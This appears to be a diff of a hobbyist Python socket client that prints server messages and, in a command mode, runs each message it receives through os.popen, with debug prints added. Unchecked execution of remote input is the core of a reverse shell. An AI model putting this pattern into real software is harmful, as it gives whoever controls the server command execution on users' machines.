@@ -1,10 +1,9 @@
-import socket
-import threading
 import os
 import sys
+import socket
 
-HOST = '192.168.1.139'
-PORT = 9090
+HOST = socket.gethostbyname(socket.gethostname())
+PORT = 80
 
 cmd_mode = False
 show_messages = True
@@ -32,21 +31,21 @@ while True:
 
     #####
 
-    # Show server messages
+    print(type(server_message))
+
+    # Show server message
     if show_messages:
         print(server_message)
     
     # Enter command to client
-    elif cmd_mode and server_message != 'cmdon':
+    elif cmd_mode == True:
+        print('test')
         os.popen(server_message)
 
-    # Send client input to server
-    client_input = input('...: ')
+    client_input = input('\n...: ')
 
     if client_input == '':
-        client_input = 'client nothing entered!'
+        client_input = 'Client nothing entered!'
 
+    # Send message to server
     s.send(client_input.encode('utf-8'))
-
-
-)
